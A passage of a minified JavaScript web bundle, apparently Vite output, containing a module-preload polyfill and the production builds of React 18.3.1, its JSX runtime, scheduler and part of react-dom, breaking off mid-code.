function ch(e,n){for(var t=0;t<n.length;t++){const s=n[t];if(typeof s!="string"&&!Array.isArray(s)){for(const r in s)if(r!=="default"&&!(r in e)){const i=Object.getOwnPropertyDescriptor(s,r);i&&Object.defineProperty(e,r,i.get?i:{enumerable:!0,get:()=>s[r]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))s(r);new MutationObserver(r=>{for(const i of r)if(i.type==="childList")for(const a of i.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&s(a)}).observe(document,{childList:!0,subtree:!0});function t(r){const i={};return r.integrity&&(i.integrity=r.integrity),r.referrerPolicy&&(i.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?i.credentials="include":r.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function s(r){if(r.ep)return;r.ep=!0;const i=t(r);fetch(r.href,i)}})();function uh(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var pu={exports:{}},di={},du={exports:{}},F={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Hs=Symbol.for("react.element"),ph=Symbol.for("react.portal"),dh=Symbol.for("react.fragment"),hh=Symbol.for("react.strict_mode"),fh=Symbol.for("react.profiler"),mh=Symbol.for("react.provider"),gh=Symbol.for("react.context"),vh=Symbol.for("react.forward_ref"),yh=Symbol.for("react.suspense"),wh=Symbol.for("react.memo"),kh=Symbol.for("react.lazy"),So=Symbol.iterator;function xh(e){return e===null||typeof e!="object"?null:(e=So&&e[So]||e["@@iterator"],typeof e=="function"?e:null)}var hu={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},fu=Object.assign,mu={};function $t(e,n,t){this.props=e,this.context=n,this.refs=mu,this.updater=t||hu}$t.prototype.isReactComponent={};$t.prototype.setState=function(e,n){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,n,"setState")};$t.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function gu(){}gu.prototype=$t.prototype;function gl(e,n,t){this.props=e,this.context=n,this.refs=mu,this.updater=t||hu}var vl=gl.prototype=new gu;vl.constructor=gl;fu(vl,$t.prototype);vl.isPureReactComponent=!0;var Eo=Array.isArray,vu=Object.prototype.hasOwnProperty,yl={current:null},yu={key:!0,ref:!0,__self:!0,__source:!0};function wu(e,n,t){var s,r={},i=null,a=null;if(n!=null)for(s in n.ref!==void 0&&(a=n.ref),n.key!==void 0&&(i=""+n.key),n)vu.call(n,s)&&!yu.hasOwnProperty(s)&&(r[s]=n[s]);var l=arguments.length-2;if(l===1)r.children=t;else if(1<l){for(var o=Array(l),c=0;c<l;c++)o[c]=arguments[c+2];r.children=o}if(e&&e.defaultProps)for(s in l=e.defaultProps,l)r[s]===void 0&&(r[s]=l[s]);return{$$typeof:Hs,type:e,key:i,ref:a,props:r,_owner:yl.current}}function bh(e,n){return{$$typeof:Hs,type:e.type,key:n,ref:e.ref,props:e.props,_owner:e._owner}}function wl(e){return typeof e=="object"&&e!==null&&e.$$typeof===Hs}function _h(e){var n={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(t){return n[t]})}var To=/\/+/g;function ji(e,n){return typeof e=="object"&&e!==null&&e.key!=null?_h(""+e.key):n.toString(36)}function wr(e,n,t,s,r){var i=typeof e;(i==="undefined"||i==="boolean")&&(e=null);var a=!1;if(e===null)a=!0;else switch(i){case"string":case"number":a=!0;break;case"object":switch(e.$$typeof){case Hs:case ph:a=!0}}if(a)return a=e,r=r(a),e=s===""?"."+ji(a,0):s,Eo(r)?(t="",e!=null&&(t=e.replace(To,"$&/")+"/"),wr(r,n,t,"",function(c){return c})):r!=null&&(wl(r)&&(r=bh(r,t+(!r.key||a&&a.key===r.key?"":(""+r.key).replace(To,"$&/")+"/")+e)),n.push(r)),1;if(a=0,s=s===""?".":s+":",Eo(e))for(var l=0;l<e.length;l++){i=e[l];var o=s+ji(i,l);a+=wr(i,n,t,o,r)}else if(o=xh(e),typeof o=="function")for(e=o.call(e),l=0;!(i=e.next()).done;)i=i.value,o=s+ji(i,l++),a+=wr(i,n,t,o,r);else if(i==="object")throw n=String(e),Error("Objects are not valid as a React child (found: "+(n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n)+"). If you meant to render a collection of children, use an array instead.");return a}function Zs(e,n,t){if(e==null)return e;var s=[],r=0;return wr(e,s,"","",function(i){return n.call(t,i,r++)}),s}function Sh(e){if(e._status===-1){var n=e._result;n=n(),n.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=n)}if(e._status===1)return e._result.default;throw e._result}var be={current:null},kr={transition:null},Eh={ReactCurrentDispatcher:be,ReactCurrentBatchConfig:kr,ReactCurrentOwner:yl};function ku(){throw Error("act(...) is not supported in production builds of React.")}F.Children={map:Zs,forEach:function(e,n,t){Zs(e,function(){n.apply(this,arguments)},t)},count:function(e){var n=0;return Zs(e,function(){n++}),n},toArray:function(e){return Zs(e,function(n){return n})||[]},only:function(e){if(!wl(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};F.Component=$t;F.Fragment=dh;F.Profiler=fh;F.PureComponent=gl;F.StrictMode=hh;F.Suspense=yh;F.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Eh;F.act=ku;F.cloneElement=function(e,n,t){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var s=fu({},e.props),r=e.key,i=e.ref,a=e._owner;if(n!=null){if(n.ref!==void 0&&(i=n.ref,a=yl.current),n.key!==void 0&&(r=""+n.key),e.type&&e.type.defaultProps)var l=e.type.defaultProps;for(o in n)vu.call(n,o)&&!yu.hasOwnProperty(o)&&(s[o]=n[o]===void 0&&l!==void 0?l[o]:n[o])}var o=arguments.length-2;if(o===1)s.children=t;else if(1<o){l=Array(o);for(var c=0;c<o;c++)l[c]=arguments[c+2];s.children=l}return{$$typeof:Hs,type:e.type,key:r,ref:i,props:s,_owner:a}};F.createContext=function(e){return e={$$typeof:gh,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:mh,_context:e},e.Consumer=e};F.createElement=wu;F.createFactory=function(e){var n=wu.bind(null,e);return n.type=e,n};F.createRef=function(){return{current:null}};F.forwardRef=function(e){return{$$typeof:vh,render:e}};F.isValidElement=wl;F.lazy=function(e){return{$$typeof:kh,_payload:{_status:-1,_result:e},_init:Sh}};F.memo=function(e,n){return{$$typeof:wh,type:e,compare:n===void 0?null:n}};F.startTransition=function(e){var n=kr.transition;kr.transition={};try{e()}finally{kr.transition=n}};F.unstable_act=ku;F.useCallback=function(e,n){return be.current.useCallback(e,n)};F.useContext=function(e){return be.current.useContext(e)};F.useDebugValue=function(){};F.useDeferredValue=function(e){return be.current.useDeferredValue(e)};F.useEffect=function(e,n){return be.current.useEffect(e,n)};F.useId=function(){return be.current.useId()};F.useImperativeHandle=function(e,n,t){return be.current.useImperativeHandle(e,n,t)};F.useInsertionEffect=function(e,n){return be.current.useInsertionEffect(e,n)};F.useLayoutEffect=function(e,n){return be.current.useLayoutEffect(e,n)};F.useMemo=function(e,n){return be.current.useMemo(e,n)};F.useReducer=function(e,n,t){return be.current.useReducer(e,n,t)};F.useRef=function(e){return be.current.useRef(e)};F.useState=function(e){return be.current.useState(e)};F.useSyncExternalStore=function(e,n,t){return be.current.useSyncExternalStore(e,n,t)};F.useTransition=function(){return be.current.useTransition()};F.version="18.3.1";du.exports=F;var S=du.exports;const xu=uh(S),Th=ch({__proto__:null,default:xu},[S]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Ch=S,Nh=Symbol.for("react.element"),Ah=Symbol.for("react.fragment"),Ph=Object.prototype.hasOwnProperty,Lh=Ch.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Rh={key:!0,ref:!0,__self:!0,__source:!0};function bu(e,n,t){var s,r={},i=null,a=null;t!==void 0&&(i=""+t),n.key!==void 0&&(i=""+n.key),n.ref!==void 0&&(a=n.ref);for(s in n)Ph.call(n,s)&&!Rh.hasOwnProperty(s)&&(r[s]=n[s]);if(e&&e.defaultProps)for(s in n=e.defaultProps,n)r[s]===void 0&&(r[s]=n[s]);return{$$typeof:Nh,type:e,key:i,ref:a,props:r,_owner:Lh.current}}di.Fragment=Ah;di.jsx=bu;di.jsxs=bu;pu.exports=di;var d=pu.exports,_u={exports:{}},Ie={},Su={exports:{}},Eu={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function n(E,L){var R=E.length;E.push(L);e:for(;0<R;){var D=R-1>>>1,B=E[D];if(0<r(B,L))E[D]=L,E[R]=B,R=D;else break e}}function t(E){return E.length===0?null:E[0]}function s(E){if(E.length===0)return null;var L=E[0],R=E.pop();if(R!==L){E[0]=R;e:for(var D=0,B=E.length,ve=B>>>1;D<ve;){var W=2*(D+1)-1,ye=E[W],le=W+1,de=E[le];if(0>r(ye,R))le<B&&0>r(de,ye)?(E[D]=de,E[le]=R,D=le):(E[D]=ye,E[W]=R,D=W);else if(le<B&&0>r(de,R))E[D]=de,E[le]=R,D=le;else break e}}return L}function r(E,L){var R=E.sortIndex-L.sortIndex;return R!==0?R:E.id-L.id}if(typeof performance=="object"&&typeof performance.now=="function"){var i=performance;e.unstable_now=function(){return i.now()}}else{var a=Date,l=a.now();e.unstable_now=function(){return a.now()-l}}var o=[],c=[],u=1,m=null,h=3,g=!1,k=!1,y=!1,x=typeof setTimeout=="function"?setTimeout:null,p=typeof clearTimeout=="function"?clearTimeout:null,f=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function v(E){for(var L=t(c);L!==null;){if(L.callback===null)s(c);else if(L.startTime<=E)s(c),L.sortIndex=L.expirationTime,n(o,L);else break;L=t(c)}}function w(E){if(y=!1,v(E),!k)if(t(o)!==null)k=!0,C(_);else{var L=t(c);L!==null&&I(w,L.startTime-E)}}function _(E,L){k=!1,y&&(y=!1,p(P),P=-1),g=!0;var R=h;try{for(v(L),m=t(o);m!==null&&(!(m.expirationTime>L)||E&&!Q());){var D=m.callback;if(typeof D=="function"){m.callback=null,h=m.priorityLevel;var B=D(m.expirationTime<=L);L=e.unstable_now(),typeof B=="function"?m.callback=B:m===t(o)&&s(o),v(L)}else s(o);m=t(o)}if(m!==null)var ve=!0;else{var W=t(c);W!==null&&I(w,W.startTime-L),ve=!1}return ve}finally{m=null,h=R,g=!1}}var N=!1,A=null,P=-1,z=5,M=-1;function Q(){return!(e.unstable_now()-M<z)}function pe(){if(A!==null){var E=e.unstable_now();M=E;var L=!0;try{L=A(!0,E)}finally{L?ae():(N=!1,A=null)}}else N=!1}var ae;if(typeof f=="function")ae=function(){f(pe)};else if(typeof MessageChannel<"u"){var b=new MessageChannel,j=b.port2;b.port1.onmessage=pe,ae=function(){j.postMessage(null)}}else ae=function(){x(pe,0)};function C(E){A=E,N||(N=!0,ae())}function I(E,L){P=x(function(){E(e.unstable_now())},L)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(E){E.callback=null},e.unstable_continueExecution=function(){k||g||(k=!0,C(_))},e.unstable_forceFrameRate=function(E){0>E||125<E?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):z=0<E?Math.floor(1e3/E):5},e.unstable_getCurrentPriorityLevel=function(){return h},e.unstable_getFirstCallbackNode=function(){return t(o)},e.unstable_next=function(E){switch(h){case 1:case 2:case 3:var L=3;break;default:L=h}var R=h;h=L;try{return E()}finally{h=R}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(E,L){switch(E){case 1:case 2:case 3:case 4:case 5:break;default:E=3}var R=h;h=E;try{return L()}finally{h=R}},e.unstable_scheduleCallback=function(E,L,R){var D=e.unstable_now();switch(typeof R=="object"&&R!==null?(R=R.delay,R=typeof R=="number"&&0<R?D+R:D):R=D,E){case 1:var B=-1;break;case 2:B=250;break;case 5:B=1073741823;break;case 4:B=1e4;break;default:B=5e3}return B=R+B,E={id:u++,callback:L,priorityLevel:E,startTime:R,expirationTime:B,sortIndex:-1},R>D?(E.sortIndex=R,n(c,E),t(o)===null&&E===t(c)&&(y?(p(P),P=-1):y=!0,I(w,R-D))):(E.sortIndex=B,n(o,E),k||g||(k=!0,C(_))),E},e.unstable_shouldYield=Q,e.unstable_wrapCallback=function(E){var L=h;return function(){var R=h;h=L;try{return E.apply(this,arguments)}finally{h=R}}}})(Eu);Su.exports=Eu;var Oh=Su.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Mh=S,Me=Oh;function T(e){for(var n="https://reactjs.org/docs/error-decoder.html?invariant="+e,t=1;t<arguments.length;t++)n+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+e+"; visit "+n+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var Tu=new Set,ks={};function dt(e,n){It(e,n),It(e+"Capture",n)}function It(e,n){for(ks[e]=n,e=0;e<n.length;e++)Tu.add(n[e])}var vn=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),pa=Object.prototype.hasOwnProperty,jh=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,Co={},No={};function Ih(e){return pa.call(No,e)?!0:pa.call(Co,e)?!1:jh.test(e)?No[e]=!0:(Co[e]=!0,!1)}function zh(e,n,t,s){if(t!==null&&t.type===0)return!1;switch(typeof n){case"function":case"symbol":return!0;case"boolean":return s?!1:t!==null?!t.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function Dh(e,n,t,s){if(n===null||typeof n>"u"||zh(e,n,t,s))return!0;if(s)return!1;if(t!==null)switch(t.type){case 3:return!n;case 4:return n===!1;case 5:return isNaN(n);case 6:return isNaN(n)||1>n}return!1}function _e(e,n,t,s,r,i,a){this.acceptsBooleans=n===2||n===3||n===4,this.attributeName=s,this.attributeNamespace=r,this.mustUseProperty=t,this.propertyName=e,this.type=n,this.sanitizeURL=i,this.removeEmptyString=a}var ue={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){ue[e]=new _e(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var n=e[0];ue[n]=new _e(n,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){ue[e]=new _e(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){ue[e]=new _e(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){ue[e]=new _e(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){ue[e]=new _e(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){ue[e]=new _e(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){ue[e]=new _e(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){ue[e]=new _e(e,5,!1,e.toLowerCase(),null,!1,!1)});var kl=/[\-:]([a-z])/g;function xl(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var n=e.replace(kl,xl);ue[n]=new _e(n,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var n=e.replace(kl,xl);ue[n]=new _e(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var n=e.replace(kl,xl);ue[n]=new _e(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){ue[e]=new _e(e,1,!1,e.toLowerCase(),null,!1,!1)});ue.xlinkHref=new _e("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){ue[e]=new _e(e,1,!1,e.toLowerCase(),null,!0,!0)});function bl(e,n,t,s){var r=ue.hasOwnProperty(n)?ue[n]:null;(r!==null?r.type!==0:s||!(2<n.length)||n[0]!=="o"&&n[0]!=="O"||n[1]!=="n"&&n[1]!=="N")&&(Dh(n,t,r,s)&&(t=null),s||r===null?Ih(n)&&(t===null?e.removeAttribute(n):e.setAttribute(n,""+t)):r.mustUseProperty?e[r.propertyName]=t===null?r.type===3?!1:"":t:(n=r.attributeName,s=r.attributeNamespace,t===null?e.removeAttribute(n):(r=r.type,t=r===3||r===4&&t===!0?"":""+t,s?e.setAttributeNS(s,n,t):e.setAttribute(n,t))))}var bn=Mh.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,Js=Symbol.for("react.element"),gt=Symbol.for("react.portal"),vt=Symbol.for("react.fragment"),_l=Symbol.for("react.strict_mode"),da=Symbol.for("react.profiler"),Cu=Symbol.for("react.provider"),Nu=Symbol.for("react.context"),Sl=Symbol.for("react.forward_ref"),ha=Symbol.for("react.suspense"),fa=Symbol.for("react.suspense_list"),El=Symbol.for("react.memo"),En=Symbol.for("react.lazy"),Au=Symbol.for("react.offscreen"),Ao=Symbol.iterator;function Xt(e){return e===null||typeof e!="object"?null:(e=Ao&&e[Ao]||e["@@iterator"],typeof e=="function"?e:null)}var K=Object.assign,Ii;function is(e){if(Ii===void 0)try{throw Error()}catch(t){var n=t.stack.trim().match(/\n( *(at )?)/);Ii=n&&n[1]||""}return`
`+Ii+e}var zi=!1;function Di(e,n){if(!e||zi)return"";zi=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(n)if(n=function(){throw Error()},Object.defineProperty(n.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(n,[])}catch(c){var s=c}Reflect.construct(e,[],n)}else{try{n.call()}catch(c){s=c}e.call(n.prototype)}else{try{throw Error()}catch(c){s=c}e()}}catch(c){if(c&&s&&typeof c.stack=="string"){for(var r=c.stack.split(`
`),i=s.stack.split(`
`),a=r.length-1,l=i.length-1;1<=a&&0<=l&&r[a]!==i[l];)l--;for(;1<=a&&0<=l;a--,l--)if(r[a]!==i[l]){if(a!==1||l!==1)do if(a--,l--,0>l||r[a]!==i[l]){var o=`
`+r[a].replace(" at new "," at ");return e.displayName&&o.includes("<anonymous>")&&(o=o.replace("<anonymous>",e.displayName)),o}while(1<=a&&0<=l);break}}}finally{zi=!1,Error.prepareStackTrace=t}return(e=e?e.displayName||e.name:"")?is(e):""}function Bh(e){switch(e.tag){case 5:return is(e.type);case 16:return is("Lazy");case 13:return is("Suspense");case 19:return is("SuspenseList");case 0:case 2:case 15:return e=Di(e.type,!1),e;case 11:return e=Di(e.type.render,!1),e;case 1:return e=Di(e.type,!0),e;default:return""}}function ma(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case vt:return"Fragment";case gt:return"Portal";case da:return"Profiler";case _l:return"StrictMode";case ha:return"Suspense";case fa:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case Nu:return(e.displayName||"Context")+".Consumer";case Cu:return(e._context.displayName||"Context")+".Provider";case Sl:var n=e.render;return e=e.displayName,e||(e=n.displayName||n.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case El:return n=e.displayName||null,n!==null?n:ma(e.type)||"Memo";case En:n=e._payload,e=e._init;try{return ma(e(n))}catch{}}return null}function Fh(e){var n=e.type;switch(e.tag){case 24:return"Cache";case 9:return(n.displayName||"Context")+".Consumer";case 10:return(n._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=n.render,e=e.displayName||e.name||"",n.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return n;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return ma(n);case 8:return n===_l?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n}return null}function Hn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Pu(e){var n=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function Uh(e){var n=Pu(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,n),s=""+e[n];if(!e.hasOwnProperty(n)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var r=t.get,i=t.set;return Object.defineProperty(e,n,{configurable:!0,get:function(){return r.call(this)},set:function(a){s=""+a,i.call(this,a)}}),Object.defineProperty(e,n,{enumerable:t.enumerable}),{getValue:function(){return s},setValue:function(a){s=""+a},stopTracking:function(){e._valueTracker=null,delete e[n]}}}}function er(e){e._valueTracker||(e._valueTracker=Uh(e))}function Lu(e){if(!e)return!1;var n=e._valueTracker;if(!n)return!0;var t=n.getValue(),s="";return e&&(s=Pu(e)?e.checked?"true":"false":e.value),e=s,e!==t?(n.setValue(e),!0):!1}function jr(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function ga(e,n){var t=n.checked;return K({},n,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??e._wrapperState.initialChecked})}function Po(e,n){var t=n.defaultValue==null?"":n.defaultValue,s=n.checked!=null?n.checked:n.defaultChecked;t=Hn(n.value!=null?n.value:t),e._wrapperState={initialChecked:s,initialValue:t,controlled:n.type==="checkbox"||n.type==="radio"?n.checked!=null:n.value!=null}}function Ru(e,n){n=n.checked,n!=null&&bl(e,"checked",n,!1)}function va(e,n){Ru(e,n);var t=Hn(n.value),s=n.type;if(t!=null)s==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+t):e.value!==""+t&&(e.value=""+t);else if(s==="submit"||s==="reset"){e.removeAttribute("value");return}n.hasOwnProperty("value")?ya(e,n.type,t):n.hasOwnProperty("defaultValue")&&ya(e,n.type,Hn(n.defaultValue)),n.checked==null&&n.defaultChecked!=null&&(e.defaultChecked=!!n.defaultChecked)}function Lo(e,n,t){if(n.hasOwnProperty("value")||n.hasOwnProperty("defaultValue")){var s=n.type;if(!(s!=="submit"&&s!=="reset"||n.value!==void 0&&n.value!==null))return;n=""+e._wrapperState.initialValue,t||n===e.value||(e.value=n),e.defaultValue=n}t=e.name,t!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,t!==""&&(e.name=t)}function ya(e,n,t){(n!=="number"||jr(e.ownerDocument)!==e)&&(t==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+t&&(e.defaultValue=""+t))}var as=Array.isArray;function Nt(e,n,t,s){if(e=e.options,n){n={};for(var r=0;r<t.length;r++)n["$"+t[r]]=!0;for(t=0;t<e.length;t++)r=n.hasOwnProperty("$"+e[t].value),e[t].selected!==r&&(e[t].selected=r),r&&s&&(e[t].defaultSelected=!0)}else{for(t=""+Hn(t),n=null,r=0;r<e.length;r++){if(e[r].value===t){e[r].selected=!0,s&&(e[r].defaultSelected=!0);return}n!==null||e[r].disabled||(n=e[r])}n!==null&&(n.selected=!0)}}function wa(e,n){if(n.dangerouslySetInnerHTML!=null)throw Error(T(91));return K({},n,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function Ro(e,n){var t=n.value;if(t==null){if(t=n.children,n=n.defaultValue,t!=null){if(n!=null)throw Error(T(92));if(as(t)){if(1<t.length)throw Error(T(93));t=t[0]}n=t}n==null&&(n=""),t=n}e._wrapperState={initialValue:Hn(t)}}function Ou(e,n){var t=Hn(n.value),s=Hn(n.defaultValue);t!=null&&(t=""+t,t!==e.value&&(e.value=t),n.defaultValue==null&&e.defaultValue!==t&&(e.defaultValue=t)),s!=null&&(e.defaultValue=""+s)}function Oo(e){var n=e.textContent;n===e._wrapperState.initialValue&&n!==""&&n!==null&&(e.value=n)}function Mu(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function ka(e,n){return e==null||e==="http://www.w3.org/1999/xhtml"?Mu(n):e==="http://www.w3.org/2000/svg"&&n==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var nr,ju=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(n,t,s,r){MSApp.execUnsafeLocalFunction(function(){return e(n,t,s,r)})}:e}(function(e,n){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=n;else{for(nr=nr||document.createElement("div"),nr.innerHTML="<svg>"+n.valueOf().toString()+"</svg>",n=nr.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;n.firstChild;)e.appendChild(n.firstChild)}});function xs(e,n){if(n){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=n;return}}e.textContent=n}var ps={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Vh=["Webkit","ms","Moz","O"];Object.keys(ps).forEach(function(e){Vh.forEach(function(n){n=n+e.charAt(0).toUpperCase()+e.substring(1),ps[n]=ps[e]})});function Iu(e,n,t){return n==null||typeof n=="boolean"||n===""?"":t||typeof n!="number"||n===0||ps.hasOwnProperty(e)&&ps[e]?(""+n).trim():n+"px"}function zu(e,n){e=e.style;for(var t in n)if(n.hasOwnProperty(t)){var s=t.indexOf("--")===0,r=Iu(t,n[t],s);t==="float"&&(t="cssFloat"),s?e.setProperty(t,r):e[t]=r}}var Hh=K({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function xa(e,n){if(n){if(Hh[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(T(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(T(60));if(typeof n.dangerouslySetInnerHTML!="object"||!("__html"in 